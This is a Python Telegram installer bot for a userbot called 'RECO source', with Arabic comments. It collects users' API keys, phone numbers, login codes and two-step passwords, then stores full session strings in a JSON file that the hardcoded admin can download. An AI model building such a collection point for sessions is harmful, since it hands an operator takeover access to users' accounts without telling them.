import re, os, asyncio, json, datetime
from telethon import TelegramClient, events, Button, functions
from telethon.errors import SessionPasswordNeededError, UserNotParticipantError
from telethon.sessions import StringSession
from config import BOT_TOKEN, API_ID, API_HASH
from user_core import start_user_source

# إعدادات الملفات والمسؤولين
DB_FILE = "database.json"
SETTINGS_FILE = "settings.json"
CHANNEL_USERNAME = "N_QQ_H" 
ADMIN_ID = 7769271031 # ايديك كمطور للسورس

# --- دالة تحميل وحفظ الإعدادات الإدارية (قفل التنصيب وقائمة الحظر) ---
def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'w') as f:
            json.dump({"setup_locked": False, "blacklist": []}, f)
    with open(SETTINGS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {"setup_locked": False, "blacklist": []}

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=4)

# --- دالة التعامل مع قاعدة بيانات المستخدمين ---
def get_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: 
                return json.load(f)
        except: 
            return {}
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# تشغيل بوت التنصيب الأساسي
bot = TelegramClient("installer_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- وظيفة فحص الاشتراك الإجباري ---
async def check_sub(user_id):
    try:
        await bot(functions.channels.GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return True

# --- معالج أمر البداية /start ---
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    settings = load_settings()
    
    # 1. التحقق من قائمة الحظر
    if event.sender_id in settings.get('blacklist', []):
        return await event.reply("🚫 **عـذراً عزيزي، لـقـد تـم حـظـرك مـن اسـتـخـدام الـبوت.**")

    # 2. التحقق من الاشتراك الإجباري
    if not await check_sub(event.sender_id):
        return await event.reply(
            f"⚠️ **يـجـب عـلـيـك الاشـتـراك لـتـفـعـيـل الـسـورس**\n\n📢 **قـنـاة الـسـورس :** @{CHANNEL_USERNAME}",
            buttons=[Button.url("اضـغـط هـنـا للاشـتـراك 📢", f"https://t.me/{CHANNEL_USERNAME}")]
        )
    
    # واجهة الأزرار
    btns = [
        [Button.inline("🚀 بـدء تـنـصـيـب ريـكـو", b"setup")],
        [Button.url("قـنـاة الـسـورس 🦅", "https://t.me/SORS_RECO"), Button.url("الـمـطـور 👤", "https://t.me/I_QQ_Q")]
    ]
    
    # إذا كان المستخدم هو المطور
    if event.sender_id == ADMIN_ID:
        btns.append([Button.inline("⚙️ لـوحـة الـتـحـكـم", b"admin_panel")])
        
    await event.reply(
        "🦅 **أهـلاً بـك فـي بـوت تـنـصـيـب سـورس ريـكـو الـمـطـور**\n\n"
        "يـمـكـنـك الآن تـنـصـيـب حـسـابـك عـلـى أقـوى سـورس حـمـايـة فـي الـتـلـيـجـرام.\n\n"
        "**اضـغـط عـلـى الـزر أدناه لـلـبـدء :**",
        buttons=btns
    )

# --- معالج عملية التنصيب (Setup) ---
@bot.on(events.CallbackQuery(data=b"setup"))
async def setup(event):
    settings = load_settings()
    
    # التحقق من حالة قفل التنصيب
    if settings.get('setup_locked', False) and event.sender_id != ADMIN_ID:
        return await event.answer("⚠️ الـتـنـصـيـب مـقـفـول حالياً من المطور، راسله للمساعدة.", alert=True)

    uid = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            await conv.send_message("✨ **أرسـل الآن API ID الـخـاص بـك :**")
            res_id = await conv.get_response()
            u_id = int(res_id.text)

            await conv.send_message("✨ **أرسـل الآن API HASH الـخـاص بـك :**")
            res_hash = await conv.get_response()
            u_hash = res_hash.text

            await conv.send_message("📱 **أرسـل رقـم هـاتـفـك مـع مـفـتـاح الـدولة (مثال: +964...) :**")
            res_phone = await conv.get_response()
            u_phone = res_phone.text

            c = TelegramClient(StringSession(), u_id, u_hash)
            await c.connect()
            await c.send_code_request(u_phone)

            await conv.send_message("🔢 **أرسـل كـود الـتـحـقـق مـع مـسـافـات (مثال: 1 2 3 4 5) :**")
            res_code = await conv.get_response()
            u_code = res_code.text.replace(" ", "")

            try:
                await c.sign_in(u_phone, u_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **أرسـل رمـز الـتـحـقـق بـخـطـوتـيـن (2FA) :**")
                res_pw = await conv.get_response()
                await c.sign_in(password=res_pw.text)

            session_str = c.session.save()
            me = await c.get_me()
            
            # حفظ البيانات في قاعدة البيانات
            db = get_db()
            date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            db[str(uid)] = {
                "api_id": u_id, 
                "api_hash": u_hash, 
                "name": me.first_name, 
                "session": session_str, 
                "date": date_now
            }
            save_db(db)
            await c.disconnect()
            
            await conv.send_message(f"🎊 **تـم الـتـنـصـيـب بـنـجـاح يـا {me.first_name} ✅**")
            
            # تشغيل الحساب فوراً في الخلفية
            asyncio.create_task(start_user_source(session_str, u_id, u_hash, db[str(uid)]))

        except Exception as e:
            await conv.send_message(f"❌ **حـدث خـطأ أثناء الـتـنـصـيـب :**\n`{e}`")

# --- لوحة تحكم المطور الشاملة ---
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    
    settings = load_settings()
    db = get_db()
    
    # نص حالة القفل
    lock_status = "🔓 التنصيب: مفتوح" if not settings.get('setup_locked') else "🔒 التنصيب: مقفول"
    
    btns = [
        [Button.inline(lock_status, b"toggle_lock")],
        [Button.inline("🚫 حظر مستخدم", b"block_user"), Button.inline("✅ إلغاء حظر", b"unblock_user")],
        [Button.inline("🗑 إزالة سورس ومسح بيانات", b"wipe_user")],
        [Button.inline("📥 سحب قاعدة JSON", b"get_backup"), Button.inline("📤 رفع قاعدة JSON", b"upload_backup")],
        [Button.inline("📢 إذاعة عامة", b"broadcast"), Button.inline("🔙 رجوع", b"back")]
    ]
    
    await event.edit(
        f"👑 **مـرحـبـاً سـيـدي الـمـطـور فـي لـوحـة الإدارة**\n\n"
        f"📊 **عـدد الـمـنـصـبـيـن حـالـيـاً :** `{len(db)}`", 
        buttons=btns
    )

# --- وظيفة قفل وفتح التنصيب ---
@bot.on(events.CallbackQuery(data=b"toggle_lock"))
async def toggle_lock(event):
    if event.sender_id != ADMIN_ID: return
    settings = load_settings()
    settings['setup_locked'] = not settings.get('setup_locked', False)
    save_settings(settings)
    await admin_panel(event)

# --- وظيفة سحب النسخة الاحتياطية ---
@bot.on(events.CallbackQuery(data=b"get_backup"))
async def get_backup(event):
    if event.sender_id != ADMIN_ID: return
    if os.path.exists(DB_FILE):
        await bot.send_file(event.chat_id, DB_FILE, caption=f"📁 نسخة احتياطية بتاريخ: {datetime.datetime.now()}")
    else:
        await event.answer("⚠️ لا يوجد ملف قاعدة بيانات حالياً.", alert=True)

# --- وظيفة رفع النسخة الاحتياطية (استعادة) ---
@bot.on(events.CallbackQuery(data=b"upload_backup"))
async def upload_backup(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📤 **أرسـل الآن مـلـف `database.json` لـتـحـديـث الـقـاعدة :**")
        msg = await conv.get_response()
        if msg.file and msg.file.name.endswith(".json"):
            await bot.download_media(msg, DB_FILE)
            await conv.send_message("✅ **تـم رفـع وتـحـديـث قاعدة البيانات بـنـجـاح.**")
        else:
            await conv.send_message("❌ **خـطأ: يـرجـى إرسـال مـلـف JSON صـحـيـح.**")

# --- وظيفة حظر مستخدم ---
@bot.on(events.CallbackQuery(data=b"block_user"))
async def block_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🚫 **أرسـل ايـدي الـمـسـتـخـدم لـحـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target not in settings['blacklist']:
                settings['blacklist'].append(target)
                save_settings(settings)
                await conv.send_message(f"✅ تم حظر `{target}` بنجاح.")
            else:
                await conv.send_message("⚠️ المستخدم محظور بالفعل.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")

# --- وظيفة إلغاء حظر مستخدم ---
@bot.on(events.CallbackQuery(data=b"unblock_user"))
async def unblock_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("✅ **أرسـل ايـدي الـمـسـتـخـدم لإلـغـاء حـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target in settings['blacklist']:
                settings['blacklist'].remove(target)
                save_settings(settings)
                await conv.send_message(f"✅ تم إلغاء حظر `{target}`.")
            else:
                await conv.send_message("⚠️ المستخدم ليس في قائمة الحظر.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")

# --- وظيفة إزالة السورس (Wipe User) ---
@bot.on(events.CallbackQuery(data=b"wipe_user"))
async def wipe_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🗑 **أرسـل ايـدي الـمـسـتـخـدم لـحـذف بـيـانـاتـه تـمـامـاً :**")
        res = await conv.get_response()
        target_id = res.text
        db = get_db()
        if target_id in db:
            del db[target_id]
            save_db(db)
            await conv.send_message(f"✅ تم حذف بيانات `{target_id}` بنجاح.")
        else:
            await conv.send_message("❌ الايدي غير موجود في قاعدة المنصبين.")

# --- وظيفة الإذاعة العامة ---
@bot.on(events.CallbackQuery(data=b"broadcast"))
async def broadcast(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📢 **أرسـل نـص الإذاعـة الآن :**")
        msg = await conv.get_response()
        db = get_db()
        sent = 0
        await conv.send_message("⏳ جاري الإرسال للجميع...")
        for uid in db:
            try:
                await bot.send_message(int(uid), msg.text)
                sent += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await conv.send_message(f"✅ تم إرسال الإذاعة إلى {sent} مستخدم.")

@bot.on(events.CallbackQuery(data=b"back"))
async def back(event):
    await start(event)

# --- وظيفة تشغيل كافة الجلسات المخزنة عند الإقلاع ---
async def load_backup():
    db = get_db()
    if db:
        print(f"🔄 جاري إعادة تشغيل {len(db)} حساب من قاعدة البيانات...")
        for uid, info in db.items():
            if "session" in info:
                try:
                    await asyncio.sleep(2) # تأخير بسيط لتجنب حظر التليجرام
                    asyncio.create_task(start_user_source(info['session'], info['api_id'], info['api_hash'], info))
                    print(f"✅ تم تفعيل حساب: {info.get('name', uid)}")
                except Exception as e:
                    print(f"⚠️ فشل تشغيل حساب {uid}: {e}")

# --- نقطة انطلاق النظام ---
if __name__ == "__main__":
    # تشغيل مهمة التحميل في الخلفية
    bot.loop.create_task(load_backup())
    
    print("---" * 10)
    print("🤖 RECO SOURCE SYSTEM IS STARTING...")
    print("🦅 بوت التنصيب ولوحة التحكم تعمل الآن.")
    print("---" * 10)
    
    # بقاء البوت في وضع الاستماع
    bot.run_until_disconnected()
